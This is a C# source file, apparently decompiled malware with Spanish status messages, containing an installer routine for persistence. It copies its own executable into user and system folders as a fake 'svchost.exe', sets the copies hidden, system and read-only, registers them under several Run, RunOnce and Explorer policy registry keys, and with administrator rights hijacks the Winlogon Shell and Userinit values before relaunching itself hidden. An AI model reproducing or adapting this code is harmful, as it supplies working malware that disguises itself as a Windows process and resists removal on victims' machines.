using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace _2012;

internal class x0_ins
{
	public static string sSelfPath = Process.GetCurrentProcess().MainModule!.FileName;

	public static string[] archivo = new string[2] { "svchost.exe", "svchost.exe" };

	public static string[] registro = new string[2] { "Windows System", "Windows System" };

	public static string[] paths = new string[2];

	public static void ins_install()
	{
		Console.WriteLine("Instalando...!");
		if (x0_fnc.fnc_admin())
		{
			Console.WriteLine("Instalando como Administrador!");
			paths[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + archivo[0];
			paths[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + "\\" + archivo[1];
		}
		else
		{
			Console.WriteLine("Instalando como Usuario!");
			paths[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + archivo[0];
			paths[1] = Environment.GetEnvironmentVariable("TEMP") + "\\" + archivo[1];
		}
		if (checkInstall())
		{
			return;
		}
		Console.WriteLine("Chequeando Instalacion...!");
		try
		{
			string[] array = paths;
			foreach (string text in array)
			{
				if (!x0_fnc.checkFile(text))
				{
					File.Copy(sSelfPath, text, overwrite: true);
				}
				File.SetAttributes(text, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		if (x0_fnc.fnc_admin())
		{
			try
			{
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)!.SetValue("Shell", "Explorer.exe \"" + paths[0] + "\"");
				Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true)!.SetValue("Userinit", "userinit.exe \"" + paths[1] + "\"");
			}
			catch (Exception value2)
			{
				Console.WriteLine(value2);
			}
		}
		else
		{
			try
			{
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true)!.SetValue(registro[1], '"' + paths[1] + '"');
				Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true)!.SetValue(registro[0], '"' + paths[0] + '"');
			}
			catch (Exception value3)
			{
				Console.WriteLine(value3);
			}
		}
		try
		{
			x0_str.xmux.Close();
			string[] array2 = paths;
			foreach (string fileName in array2)
			{
				Process process = new Process();
				process.StartInfo.FileName = fileName;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch (Exception value4)
		{
			Console.WriteLine(value4);
		}
		Environment.Exit(-1);
	}

	private static bool checkInstall()
	{
		string[] array = paths;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				string filePath = array[num];
				if (!x0_fnc.checkFile(filePath))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}
}
